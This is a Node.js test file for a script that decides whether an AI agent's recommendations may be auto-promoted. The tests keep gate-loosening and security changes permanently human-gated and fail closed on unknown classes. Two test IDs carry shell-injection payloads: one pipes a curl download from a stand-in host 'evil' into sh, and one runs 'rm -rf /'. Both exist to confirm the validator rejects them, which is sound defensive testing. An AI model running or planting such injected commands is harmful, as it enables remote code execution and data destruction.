'use strict';

const { test } = require('node:test');
const assert = require('node:assert');
const path = require('path');

const {
  checkPromotionEligible, findRecommendation,
} = require(path.resolve(__dirname, '..', '.claude', 'scripts', 'promote-recommendation.js'));

function rec(overrides) {
  return {
    id: 'REC-20260714-001',
    target: '.claude/hooks/lib/loop-health.js',
    change: 'Tighten the tool-error-rate attention line.',
    class: 'sensor-tune',
    risk: 'low',
    cost: 'low',
    benefit: 'med',
    confidence: 0.7,
    evidence: ['specs/retro/loop-health.md#observations'],
    status: 'approved',
    ...overrides,
  };
}

// --- checkPromotionEligible: the deterministic guardrail --------------------

test('checkPromotionEligible: an approved, non-gated recommendation is eligible', () => {
  const r = checkPromotionEligible(rec());
  assert.strictEqual(r.eligible, true);
});

test('checkPromotionEligible: refuses anything not status:approved', () => {
  for (const status of ['proposed', 'deferred', 'rejected']) {
    const r = checkPromotionEligible(rec({ status }));
    assert.strictEqual(r.eligible, false);
    assert.match(r.reason, /approved/i);
  }
});

test('checkPromotionEligible: refuses re-promoting an already-promoted recommendation', () => {
  const r = checkPromotionEligible(rec({ status: 'promoted' }));
  assert.strictEqual(r.eligible, false);
  assert.match(r.reason, /already promoted/i);
});

// --- the hard, permanent invariant: never auto-promote gate-loosen/security -

test('checkPromotionEligible: HARD BLOCKS class:gate-loosen, regardless of approval', () => {
  const r = checkPromotionEligible(rec({ class: 'gate-loosen', human_gate: true }));
  assert.strictEqual(r.eligible, false);
  assert.match(r.reason, /permanently human-gated|never.*promot/i);
});

test('checkPromotionEligible: HARD BLOCKS class:security, regardless of approval', () => {
  const r = checkPromotionEligible(rec({ class: 'security', human_gate: true }));
  assert.strictEqual(r.eligible, false);
  assert.match(r.reason, /permanently human-gated|never.*promot/i);
});

test('checkPromotionEligible: the gate-loosen/security block cannot be bypassed by any field value', () => {
  // Not even a maximally-trusted-looking recommendation gets through.
  const r = checkPromotionEligible(rec({
    class: 'security', confidence: 1.0, risk: 'low', human_gate: true, status: 'approved',
  }));
  assert.strictEqual(r.eligible, false);
});

test('checkPromotionEligible: low-risk classes other than gate-loosen/security are eligible', () => {
  for (const class_ of ['docs', 'sensor-tune', 'gate-tighten', 'rule-add', 'prompt-edit']) {
    const r = checkPromotionEligible(rec({ class: class_ }));
    assert.strictEqual(r.eligible, true, `class ${class_} should be eligible`);
  }
});

// --- fail-closed, not fail-open: unknown/missing class must be refused, not silently allowed ---

test('checkPromotionEligible: refuses a missing/undefined class (allowlist, not denylist)', () => {
  const r = checkPromotionEligible(rec({ class: undefined }));
  assert.strictEqual(r.eligible, false);
});

test('checkPromotionEligible: refuses an unrecognized/future class, not just the two known-gated ones', () => {
  const r = checkPromotionEligible(rec({ class: 'gate-loosen-temp' }));
  assert.strictEqual(r.eligible, false);
});

test('checkPromotionEligible: refuses a mis-cased class rather than matching loosely', () => {
  const r = checkPromotionEligible(rec({ class: 'Docs' }));
  assert.strictEqual(r.eligible, false);
});

// --- id format: a real choke point against branch-name shell injection ---

test('checkPromotionEligible: refuses an id that does not match REC-YYYYMMDD-NNN', () => {
  const r = checkPromotionEligible(rec({ id: 'x$(curl evil|sh)' }));
  assert.strictEqual(r.eligible, false);
  assert.match(r.reason, /format/i);
});

test('checkPromotionEligible: refuses an id containing shell metacharacters even if otherwise plausible', () => {
  const r = checkPromotionEligible(rec({ id: 'REC-20260714-001; rm -rf /' }));
  assert.strictEqual(r.eligible, false);
});

test('checkPromotionEligible: accepts a well-formed id', () => {
  const r = checkPromotionEligible(rec({ id: 'REC-20260714-001' }));
  assert.strictEqual(r.eligible, true);
});

// --- findRecommendation ------------------------------------------------------

test('findRecommendation: finds by id in a list', () => {
  const list = [rec({ id: 'A' }), rec({ id: 'B' })];
  assert.strictEqual(findRecommendation(list, 'B').id, 'B');
});

test('findRecommendation: returns null when id is absent', () => {
  const list = [rec({ id: 'A' })];
  assert.strictEqual(findRecommendation(list, 'ZZZ'), null);
});

// --- CLI wrapper: exit codes -------------------------------------------------

const { spawnSync } = require('node:child_process');
const fs = require('node:fs');
const os = require('node:os');

const SCRIPT = path.resolve(__dirname, '..', '.claude', 'scripts', 'promote-recommendation.js');

function tmpRecommendationsFile(entries) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'promote-cli-'));
  const file = path.join(dir, 'recommendations.jsonl');
  fs.writeFileSync(file, entries.map((e) => JSON.stringify(e)).join('\n') + '\n');
  return file;
}

test('CLI: exit 0 and ELIGIBLE for an approved, non-gated recommendation', () => {
  const file = tmpRecommendationsFile([rec({ id: 'REC-20260714-001' })]);
  const r = spawnSync('node', [SCRIPT, '--check', 'REC-20260714-001', file], { encoding: 'utf8' });
  assert.strictEqual(r.status, 0, r.stdout + r.stderr);
  assert.match(r.stdout, /ELIGIBLE/);
});

test('CLI: exit 1 and prints the reason for a gate-loosen recommendation', () => {
  const file = tmpRecommendationsFile([rec({ id: 'REC-20260714-002', class: 'gate-loosen', human_gate: true })]);
  const r = spawnSync('node', [SCRIPT, '--check', 'REC-20260714-002', file], { encoding: 'utf8' });
  assert.strictEqual(r.status, 1);
  assert.match(r.stderr, /INELIGIBLE/);
  assert.match(r.stderr, /permanently human-gated/);
});

test('CLI: exit 2 on usage error (no --check id)', () => {
  const r = spawnSync('node', [SCRIPT], { encoding: 'utf8' });
  assert.strictEqual(r.status, 2);
});

test('CLI: exit 1 and prints "not found" when the id is absent from the file', () => {
  const file = tmpRecommendationsFile([rec({ id: 'REC-20260714-001' })]);
  const r = spawnSync('node', [SCRIPT, '--check', 'REC-99999999-999', file], { encoding: 'utf8' });
  assert.strictEqual(r.status, 1);
  assert.match(r.stderr, /not found/i);
});

test('CLI: exit 2 when the recommendations file does not exist', () => {
  const r = spawnSync('node', [SCRIPT, '--check', 'REC-20260714-001', '/nonexistent/recommendations.jsonl'], { encoding: 'utf8' });
  assert.strictEqual(r.status, 2);
  assert.match(r.stderr, /cannot read/i);
});

test('CLI: exit 2 on a malformed (unparseable) recommendations file', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'promote-cli-'));
  const file = path.join(dir, 'recommendations.jsonl');
  fs.writeFileSync(file, 'not valid json\n');
  const r = spawnSync('node', [SCRIPT, '--check', 'REC-20260714-001', file], { encoding: 'utf8' });
  assert.strictEqual(r.status, 2);
});
